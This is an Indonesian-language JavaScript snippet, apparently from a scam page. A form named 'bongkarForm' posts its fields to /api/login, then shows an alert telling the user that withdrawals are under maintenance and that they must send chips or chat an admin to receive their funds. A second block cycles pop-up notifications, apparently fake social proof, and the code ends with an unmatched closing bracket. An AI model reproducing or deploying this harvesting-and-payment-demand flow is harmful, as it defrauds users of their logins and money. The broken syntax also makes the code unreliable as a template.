<script>
document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    // Pastikan tombol kirim berubah status agar user tidak klik berkali-kali
    const btn = this.querySelector("button[type='submit']");
    btn.innerText = "Mengirim...";
    btn.disabled = true;

    // Ambil data form
    const formData = new FormData(this);
    const data = Object.fromEntries(formData.entries());

    try {
        // Fetch ke api/login
        const res = await fetch("/api/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await res.json();

        if (result.status === "success") {
            alert("Pencairan Maintenance❗️ Silahkan Melakukan Pengiriman Chip Agar Dana Anda Segera Di Cairkan Atau Chat Admin");
            this.reset();
        } else {
            alert("❌ Gagal: " + result.message);
        }
    } catch (err) {
        alert("❌ ERROR");
    } finally {
        btn.innerText = "Kirim";
        btn.disabled = false;
    }
});

            const container = document.getElementById('notifications-container');
            let currentIndex = 0;

            function createNotification(notification) {
                const notificationDiv = document.createElement('div');
                notificationDiv.className = 'notification';

                const icon = document.createElement('img');
                icon.src = 'img/reg_gold_.png';
                icon.alt = 'Icon Pemberitahuan';
                icon.className = 'notification-icon';

                const contentDiv = document.createElement('div');
                contentDiv.className = 'notification-content';

                const titleDiv = document.createElement('div');
                titleDiv.className = 'notification-title';
                titleDiv.textContent = notification.title;

                const messageDiv = document.createElement('div');
                messageDiv.className = 'notification-message';
                messageDiv.textContent = notification.message;

                contentDiv.appendChild(titleDiv);
                contentDiv.appendChild(messageDiv);
                notificationDiv.appendChild(icon);
                notificationDiv.appendChild(contentDiv);

                container.appendChild(notificationDiv);

                
                setTimeout(() => {
                    container.removeChild(notificationDiv);
                }, 4000);
            }

            function showNotifications() {
                setInterval(() => {
                    createNotification(notifications[currentIndex]);
                    currentIndex = (currentIndex + 1) % notifications.length;
                }, 6000); 
            }

            showNotifications();
        });
